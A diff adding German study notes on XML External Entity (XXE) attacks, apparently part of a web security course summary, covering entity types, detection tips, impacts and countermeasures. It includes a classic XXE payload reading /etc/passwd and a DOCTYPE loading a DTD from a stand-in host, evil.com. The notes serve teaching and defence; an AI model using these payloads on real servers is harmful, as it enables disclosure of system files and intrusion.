@@ -662,3 +662,78 @@ Beinhaltet seit 2021 auch XML eXternal Entities (XXE)
 XML-Format wird für Datenaustausch verwendet
 
 Schwachstelle, wenn XML ungeprüft vom Server ausgewertet wird
+
+**XML Entitäten** werden in **Document Type Declaration** (DTD) als Tags definiert
+
+- **Classic**: external Entity wird in lokales DTD eingefügt
+- **Blind**: keine Ausgabe oder Error Message
+- **Error**: gewünschten Inhalt in Error Message erhalten
+
+Typen von Entitäten
+
+- **General Entities**
+
+```xml
+<!ENTITY name "Hello World">
+```
+
+- **Parameter Entities** (können weitere Entities enthalten)
+
+```xml
+<!ENTITY % name "Hello World">
+<!ENTITY % name "Hello %myEntity;">
+```
+
+- **External Entities** (können externe Ressourcen einbinden, auch im DOCTYPE möglich)
+
+```xml
+<!ENTITY name SYSTEM "URI/URL">
+<!ENTITY name PUBLIC "any_text" "URI/URL">
+<!DOCTYPE name SYSTEM "address.dtd" [...]>
+<!DOCTYPE name PUBLIC "any_text" "http://evil.com/evil.dtd">
+```
+
+Beispiel (Definition und Zugriff auf eine Entität):
+
+```xml
+<?xml version="1.0" standalone="yes" ?>
+  <!DOCTYPE author [
+    <!ELEMENT author (#PCDATA)>
+    <!ENTITY js "Jo Smith">
+  ]>
+
+  <author>&js;</author>
+```
+
+Beispiel geänderter XML Request für Zugriff auf /etc/passwd:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+  <!DOCTYPE foo [
+    <!ELEMENT foo ANY>
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+
+  <foo>&xxe;</foo>
+```
+
+#### Schwachstelle bei XML erkennen
+
+- Mit Metacharakteren auf XML Injection testen
+  - ', ", <>, \<!--/-->, &, \<![CDATA[ / ]]>
+- ein einfaches Beispiel testen
+- Tag Injection: Eingabe von XML Tags in Eingabefelder testen
+
+#### Mögliche Auswirkungen von XXE
+
+- Zugriff auf Ressourcen eines lokalen Netzwerks
+- Remote Code Execution (eher selten)
+- Denial-of-Service (DoS)
+
+#### Gegenmaßnahmen gegen XXE
+
+- DTDs External Entities vollständig deaktivieren
+- Alternativ Unterbindung der Auflösung von "External Entities"
+- auch die Content-Type und Accept Headers validieren
+- Benutzereingaben, die zu XML geparst werden immer server-seitig mit Allowlist validieren
+- böswillige Anfragen mit "406/Not Acceptable" beantworten
